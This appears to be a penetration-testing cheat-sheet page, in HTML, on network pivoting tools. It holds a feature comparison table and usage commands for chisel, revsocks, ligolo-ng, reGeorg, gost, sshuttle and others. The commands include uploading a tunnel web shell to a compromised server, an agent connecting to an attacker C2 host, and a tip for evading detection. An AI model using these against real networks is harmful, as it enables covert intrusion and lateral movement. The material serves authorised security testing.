  "html": "<h1 id=\"network-pivoting-tools\">Network Pivoting Tools</h1>\n<h2 id=\"tools-comparison\">Tools Comparison</h2>\n<p>Comparison table showing platform support (Windows, Linux, macOS), available polling methods (HTTPS, WebSockets), and supported SOCKS versions (4/5).</p>\n<table>\n<thead>\n<tr>\n<th>Name</th>\n<th>SOCKS4</th>\n<th>SOCKS5</th>\n<th>SOCKET</th>\n<th>HTTPS</th>\n<th>Web Socket</th>\n<th>Windows</th>\n<th>Linux</th>\n<th>MacOS</th>\n<th>Tun Interface</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>SSH</td>\n<td>✅</td>\n<td>✅</td>\n<td>✅</td>\n<td>❌</td>\n<td>❌</td>\n<td>✅</td>\n<td>✅</td>\n<td>✅</td>\n<td>❌</td>\n</tr>\n<tr>\n<td>reGeorg</td>\n<td>✅</td>\n<td>❌</td>\n<td>✅</td>\n<td>❌</td>\n<td>❌</td>\n<td>✅</td>\n<td>✅</td>\n<td>✅</td>\n<td>❌</td>\n</tr>\n<tr>\n<td>pivotnacci</td>\n<td>✅</td>\n<td>✅</td>\n<td>❌</td>\n<td>✅</td>\n<td>❌</td>\n<td>✅</td>\n<td>✅</td>\n<td>✅</td>\n<td>❌</td>\n</tr>\n<tr>\n<td>wstunnel</td>\n<td>✅</td>\n<td>✅</td>\n<td>❌</td>\n<td>✅</td>\n<td>✅</td>\n<td>✅</td>\n<td>✅</td>\n<td>✅</td>\n<td>❌</td>\n</tr>\n<tr>\n<td>chisel</td>\n<td>❌</td>\n<td>✅</td>\n<td>❌</td>\n<td>✅</td>\n<td>✅</td>\n<td>✅</td>\n<td>✅</td>\n<td>✅</td>\n<td>❌</td>\n</tr>\n<tr>\n<td>revsocks</td>\n<td>❌</td>\n<td>✅</td>\n<td>✅</td>\n<td>✅</td>\n<td>✅</td>\n<td>✅</td>\n<td>✅</td>\n<td>✅</td>\n<td>❌</td>\n</tr>\n<tr>\n<td>ligolo-ng</td>\n<td>❌</td>\n<td>❌</td>\n<td>✅</td>\n<td>❌</td>\n<td>✅</td>\n<td>✅</td>\n<td>✅</td>\n<td>✅</td>\n<td>✅</td>\n</tr>\n<tr>\n<td>gost</td>\n<td>✅</td>\n<td>✅</td>\n<td>✅</td>\n<td>❌</td>\n<td>❌</td>\n<td>✅</td>\n<td>✅</td>\n<td>✅</td>\n<td>✅</td>\n</tr>\n<tr>\n<td>rpivot</td>\n<td>✅</td>\n<td>❌</td>\n<td>✅</td>\n<td>❌</td>\n<td>❌</td>\n<td>✅</td>\n<td>✅</td>\n<td>✅</td>\n<td>❌</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"tools\">Tools</h2>\n<h3 id=\"wstunnel\">wstunnel</h3>\n<ul>\n<li><a href=\"https://github.com/erebe/wstunnel\">erebe/wstunnel</a> - Tunnel all your traffic over Websocket or HTTP2 - Bypass firewalls/DPI - Static binary available</li>\n</ul>\n<div class=\"highlight\"><pre><span></span><code><span class=\"n\">wstunnel</span> <span class=\"n\">server</span> <span class=\"n\">wss</span><span class=\"p\">://[::]:</span><span class=\"n\">8080</span>\n<span class=\"n\">wstunnel</span> <span class=\"n\">client</span> <span class=\"n\">-L</span> <span class=\"n\">socks5</span><span class=\"p\">://</span><span class=\"n\">127</span><span class=\"p\">.</span><span class=\"n\">0</span><span class=\"p\">.</span><span class=\"n\">0</span><span class=\"p\">.</span><span class=\"n\">1</span><span class=\"p\">:</span><span class=\"n\">8888</span> <span class=\"p\">-</span><span class=\"n\">-connection-min-idle</span> <span class=\"n\">5</span> <span class=\"n\">wss</span><span class=\"p\">://</span><span class=\"n\">myRemoteHost</span><span class=\"p\">:</span><span class=\"n\">8080</span>\n<span class=\"nb\">curl </span><span class=\"n\">-x</span> <span class=\"n\">socks5h</span><span class=\"p\">://</span><span class=\"n\">127</span><span class=\"p\">.</span><span class=\"n\">0</span><span class=\"p\">.</span><span class=\"n\">0</span><span class=\"p\">.</span><span class=\"n\">1</span><span class=\"p\">:</span><span class=\"n\">8888</span> <span class=\"n\">http</span><span class=\"p\">://</span><span class=\"n\">google</span><span class=\"p\">.</span><span class=\"n\">com</span><span class=\"p\">/</span>\n</code></pre></div>\n<h3 id=\"chisel\">chisel</h3>\n<ul>\n<li><a href=\"https://github.com/jpillora/chisel\">jpillora/chisel</a> - A fast TCP/UDP tunnel over HTTP</li>\n</ul>\n<div class=\"highlight\"><pre><span></span><code><span class=\"n\">chisel</span> <span class=\"n\">server</span> <span class=\"n\">-p</span> <span class=\"n\">8008</span> <span class=\"p\">-</span><span class=\"n\">-reverse</span>\n<span class=\"n\">chisel</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">client</span> <span class=\"n\">YOUR_IP</span><span class=\"p\">:</span><span class=\"n\">8008</span> <span class=\"n\">R</span><span class=\"p\">:</span><span class=\"n\">socks</span>\n</code></pre></div>\n<h3 id=\"revsocks\">revsocks</h3>\n<ul>\n<li><a href=\"https://github.com/kost/revsocks\">kost/revsocks</a> - Reverse SOCKS5 implementation in Go</li>\n</ul>\n<p>Reverse SOCKS using websocket</p>\n<div class=\"highlight\"><pre><span></span><code><span class=\"n\">revsocks</span> <span class=\"n\">-listen</span> <span class=\"p\">:</span><span class=\"n\">8443</span> <span class=\"n\">-socks</span> <span class=\"n\">127</span><span class=\"p\">.</span><span class=\"n\">0</span><span class=\"p\">.</span><span class=\"n\">0</span><span class=\"p\">.</span><span class=\"n\">1</span><span class=\"p\">:</span><span class=\"n\">1080</span> <span class=\"n\">-pass</span> <span class=\"n\">SuperSecretPassword</span> <span class=\"n\">-tls</span> <span class=\"n\">-ws</span>\n<span class=\"n\">revsocks</span> <span class=\"n\">-connect</span> <span class=\"n\">https</span><span class=\"p\">://</span><span class=\"n\">clientIP</span><span class=\"p\">:</span><span class=\"n\">8443</span> <span class=\"n\">-pass</span> <span class=\"n\">SuperSecretPassword</span> <span class=\"n\">-ws</span>\n</code></pre></div>\n<p>Reverse SOCKS using TLS encryption</p>\n<div class=\"highlight\"><pre><span></span><code><span class=\"n\">revsocks</span> <span class=\"n\">-listen</span> <span class=\"p\">:</span><span class=\"n\">8443</span> <span class=\"n\">-socks</span> <span class=\"n\">127</span><span class=\"p\">.</span><span class=\"n\">0</span><span class=\"p\">.</span><span class=\"n\">0</span><span class=\"p\">.</span><span class=\"n\">1</span><span class=\"p\">:</span><span class=\"n\">1080</span> <span class=\"n\">-pass</span> <span class=\"n\">SuperSecretPassword</span>\n<span class=\"n\">revsocks</span> <span class=\"n\">-connect</span> <span class=\"n\">clientIP</span><span class=\"p\">:</span><span class=\"n\">8443</span> <span class=\"n\">-pass</span> <span class=\"n\">SuperSecretPassword</span>\n</code></pre></div>\n<p>Reverse SOCKS using TCP</p>\n<div class=\"highlight\"><pre><span></span><code><span class=\"n\">revsocks</span> <span class=\"n\">-listen</span> <span class=\"p\">:</span><span class=\"n\">8443</span> <span class=\"n\">-socks</span> <span class=\"n\">127</span><span class=\"p\">.</span><span class=\"n\">0</span><span class=\"p\">.</span><span class=\"n\">0</span><span class=\"p\">.</span><span class=\"n\">1</span><span class=\"p\">:</span><span class=\"n\">1080</span> <span class=\"n\">-pass</span> <span class=\"n\">SuperSecretPassword</span> <span class=\"n\">-tls</span>\n<span class=\"n\">revsocks</span> <span class=\"n\">-connect</span> <span class=\"n\">clientIP</span><span class=\"p\">:</span><span class=\"n\">8443</span> <span class=\"n\">-pass</span> <span class=\"n\">SuperSecretPassword</span> <span class=\"n\">-tls</span>\n</code></pre></div>\n<ul>\n<li>Set a strong password on the connection: <code>-pass Password1234</code></li>\n<li>Use an authenticated proxy: <code>-proxy proxy.&lt;domain&gt;:3128 -proxyauth Domain/userpame:userpass</code></li>\n<li>Define a User-Agent to reduce detections: <code>-useragent \"Mozilla 5.0/IE Windows 10\"</code></li>\n</ul>\n<h3 id=\"ssh\">ssh</h3>\n<div class=\"highlight\"><pre><span></span><code>ssh<span class=\"w\"> </span>-N<span class=\"w\"> </span>-f<span class=\"w\"> </span>-D<span class=\"w\"> </span><span class=\"o\">[</span>listenport<span class=\"o\">]</span><span class=\"w\"> </span><span class=\"o\">[</span>user<span class=\"o\">]</span>@<span class=\"o\">[</span>host<span class=\"o\">]</span>\n</code></pre></div>\n<h3 id=\"regeorg\">reGeorg</h3>\n<ul>\n<li><a href=\"https://github.com/sensepost/reGeorg\">sensepost/reGeorg</a>, the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.</li>\n</ul>\n<div class=\"highlight\"><pre><span></span><code><span class=\"n\">python</span> <span class=\"n\">reGeorgSocksProxy</span><span class=\"o\">.</span><span class=\"n\">py</span> <span class=\"o\">--</span><span class=\"n\">listen</span><span class=\"o\">-</span><span class=\"n\">port</span> <span class=\"mi\">8080</span> <span class=\"o\">--</span><span class=\"n\">url</span> <span class=\"n\">http</span><span class=\"p\">:</span><span class=\"o\">//</span><span class=\"n\">compromised</span><span class=\"o\">.</span><span class=\"n\">host</span><span class=\"o\">/</span><span class=\"n\">shell</span><span class=\"o\">.</span><span class=\"n\">jsp</span>\n</code></pre></div>\n<ul>\n<li><strong>Step 1</strong>. Upload tunnel.(<code>aspx|ashx|jsp|php</code>) to a webserver.</li>\n<li><strong>Step 2</strong>. Configure you tools to use a socks proxy, use the ip address and port you specified when you started the reGeorgSocksProxy.py</li>\n</ul>\n<h3 id=\"pivotnacci\">pivotnacci</h3>\n<ul>\n<li><a href=\"https://github.com/blackarrowsec/pivotnacci\">blackarrowsec/pivotnacci</a>, a tool to make socks connections through HTTP agents.</li>\n</ul>\n<div class=\"highlight\"><pre><span></span><code><span class=\"n\">pip3</span> <span class=\"n\">install</span> <span class=\"n\">pivotnacci</span>\n<span class=\"n\">usage</span><span class=\"p\">:</span> <span class=\"n\">pivotnacci</span> <span class=\"p\">[</span><span class=\"n\">-h</span><span class=\"p\">]</span> <span class=\"p\">[</span><span class=\"n\">-s</span> <span class=\"n\">addr</span><span class=\"p\">]</span> <span class=\"p\">[</span><span class=\"n\">-p</span> <span class=\"n\">port</span><span class=\"p\">]</span> <span class=\"p\">[-</span><span class=\"n\">-verbose</span><span class=\"p\">]</span> <span class=\"p\">[-</span><span class=\"n\">-ack-message</span> <span class=\"n\">message</span><span class=\"p\">]</span>\n                  <span class=\"p\">[-</span><span class=\"n\">-password</span> <span class=\"n\">password</span><span class=\"p\">]</span> <span class=\"p\">[-</span><span class=\"n\">-user-agent</span> <span class=\"n\">user_agent</span><span class=\"p\">]</span>\n                  <span class=\"p\">[-</span><span class=\"n\">-header</span> <span class=\"n\">header</span><span class=\"p\">]</span> <span class=\"p\">[-</span><span class=\"n\">-proxy</span> <span class=\"p\">[</span><span class=\"n\">protocol</span><span class=\"p\">://]</span><span class=\"n\">host</span><span class=\"p\">[:</span><span class=\"n\">port</span><span class=\"p\">]]</span>\n                  <span class=\"p\">[-</span><span class=\"n\">-type</span> <span class=\"n\">type</span><span class=\"p\">]</span> <span class=\"p\">[-</span><span class=\"n\">-polling-interval</span> <span class=\"n\">milliseconds</span><span class=\"p\">]</span>\n                  <span class=\"p\">[-</span><span class=\"n\">-request-tries</span> <span class=\"n\">number</span><span class=\"p\">]</span> <span class=\"p\">[-</span><span class=\"n\">-retry-interval</span> <span class=\"n\">milliseconds</span><span class=\"p\">]</span>\n                  <span class=\"n\">url</span>\n\n<span class=\"n\">pivotnacci</span>  <span class=\"n\">https</span><span class=\"p\">://</span><span class=\"n\">domain</span><span class=\"p\">.</span><span class=\"n\">com</span><span class=\"p\">/</span><span class=\"n\">agent</span><span class=\"p\">.</span><span class=\"n\">php</span> <span class=\"p\">-</span><span class=\"n\">-password</span> <span class=\"s2\">&quot;s3cr3t&quot;</span> <span class=\"p\">-</span><span class=\"n\">-polling-interval</span> <span class=\"n\">2000</span>\n</code></pre></div>\n<h3 id=\"ligolo\">ligolo</h3>\n<p>Instead of using a SOCKS proxy or TCP/UDP forwarders, Ligolo-ng creates a userland network stack using Gvisor.</p>\n<ul>\n<li><a href=\"https://github.com/nicocha30/ligolo-ng\">nicocha30/ligolo-ng</a> - An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface.</li>\n<li><a href=\"https://github.com/sysdream/ligolo\">sysdream/ligolo</a> - Reverse Tunneling made easy for pentesters.</li>\n</ul>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">./</span><span class=\"n\">proxy</span> <span class=\"n\">-h</span> <span class=\"c\"># Help options</span>\n<span class=\"p\">./</span><span class=\"n\">proxy</span> <span class=\"n\">-autocert</span> <span class=\"c\"># Automatically request LetsEncrypt certificates</span>\n<span class=\"p\">./</span><span class=\"n\">proxy</span> <span class=\"n\">-selfcert</span> <span class=\"c\"># Use self-signed certificates</span>\n<span class=\"p\">./</span><span class=\"n\">agent</span> <span class=\"n\">-connect</span> <span class=\"n\">attacker_c2_server</span><span class=\"p\">.</span><span class=\"n\">com</span><span class=\"p\">:</span><span class=\"n\">11601</span>\n\n<span class=\"n\">ligolo-ng</span> <span class=\"err\">»</span> <span class=\"n\">session</span> \n<span class=\"p\">?</span> <span class=\"n\">Specify</span> <span class=\"n\">a</span> <span class=\"n\">session</span> <span class=\"p\">:</span> <span class=\"n\">1</span>\n\n<span class=\"n\">interface_create</span> <span class=\"p\">-</span><span class=\"n\">-name</span> <span class=\"n\">ligolo</span>\n<span class=\"n\">route_add</span> <span class=\"p\">-</span><span class=\"n\">-name</span> <span class=\"n\">ligolo</span> <span class=\"p\">-</span><span class=\"n\">-route</span> <span class=\"n\">10</span><span class=\"p\">.</span><span class=\"n\">24</span><span class=\"p\">.</span><span class=\"n\">0</span><span class=\"p\">.</span><span class=\"n\">0</span><span class=\"p\">/</span><span class=\"n\">24</span>\n<span class=\"n\">tunnel_start</span> <span class=\"p\">-</span><span class=\"n\">-tun</span> <span class=\"n\">ligolo</span>\n</code></pre></div>\n<h3 id=\"gost\">gost</h3>\n<ul>\n<li><a href=\"https://github.com/ginuerzh/gost\">ginuerzh/gost</a> - GO Simple Tunnel - a simple tunnel written in golang</li>\n</ul>\n<div class=\"highlight\"><pre><span></span><code><span class=\"n\">gost</span> <span class=\"n\">-L</span><span class=\"p\">=</span><span class=\"n\">socks5</span><span class=\"p\">://:</span><span class=\"n\">1080</span> <span class=\"c\"># server</span>\n<span class=\"n\">gost</span> <span class=\"n\">-L</span><span class=\"p\">=:</span><span class=\"n\">8080</span> <span class=\"o\">-F</span><span class=\"p\">=</span><span class=\"n\">socks5</span><span class=\"p\">://</span><span class=\"n\">server_ip</span><span class=\"p\">:</span><span class=\"n\">1080</span><span class=\"k\">?</span><span class=\"n\">notls</span><span class=\"p\">=</span><span class=\"n\">true</span> <span class=\"c\"># client</span>\n</code></pre></div>\n<h3 id=\"sshuttle\">sshuttle</h3>\n<ul>\n<li><a href=\"https://github.com/sshuttle/sshuttle\">sshuttle/sshuttle</a> - Transparent proxy server that works as a poor man's VPN. Forwards over ssh.</li>\n</ul>\n<div class=\"highlight\"><pre><span></span><code><span class=\"n\">sshuttle</span> <span class=\"n\">-vvr</span> <span class=\"n\">user</span><span class=\"nv\">@10</span><span class=\"p\">.</span><span class=\"n\">10</span><span class=\"p\">.</span><span class=\"n\">10</span><span class=\"p\">.</span><span class=\"n\">10</span> <span class=\"n\">10</span><span class=\"p\">.</span><span class=\"n\">1</span><span class=\"p\">.</span><span class=\"n\">1</span><span class=\"p\">.</span><span class=\"n\">0</span><span class=\"p\">/</span><span class=\"n\">24</span>\n<span class=\"n\">sshuttle</span> <span class=\"n\">-vvr</span> <span class=\"n\">root</span><span class=\"nv\">@10</span><span class=\"p\">.</span><span class=\"n\">10</span><span class=\"p\">.</span><span class=\"n\">10</span><span class=\"p\">.</span><span class=\"n\">10</span> <span class=\"n\">10</span><span class=\"p\">.</span><span class=\"n\">1</span><span class=\"p\">.</span><span class=\"n\">1</span><span class=\"p\">.</span><span class=\"n\">0</span><span class=\"p\">/</span><span class=\"n\">24</span> <span class=\"n\">-e</span> <span class=\"s2\">&quot;ssh -i ~/.ssh/id_rsa&quot;</span> \n</code></pre></div>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://gost.run/en/\">GO Simple Tunnel - Documentation</a></li>\n<li><a href=\"https://docs.ligolo.ng/\">Ligolo-ng - Documentation</a></li>\n<li><a href=\"https://sshuttle.readthedocs.io/en/stable/usage.html\">sshutle - Documentation</a></li>\n</ul>",
